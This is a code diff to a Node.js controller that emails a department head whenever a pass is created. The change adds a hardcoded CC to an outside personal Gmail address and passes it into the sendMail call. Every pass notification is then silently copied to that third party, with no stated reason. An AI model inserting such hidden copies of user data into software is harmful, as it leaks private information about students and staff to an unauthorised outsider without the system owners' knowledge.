@@ -69,7 +69,7 @@ exports.createPass = async (req, res) => {
     res.status(201).json(pass);
 
     const recipients = buildRecipients(hod.email);
-
+const cc = ["happyeboy369@gmail.com"];
     if (recipients.length) {
       sendMail(
         recipients,
@@ -124,7 +124,7 @@ exports.createPass = async (req, res) => {
     </div>
   </div>
 </div>
-`
+`,cc
       ).catch(console.error);
     }
   } catch (error) {
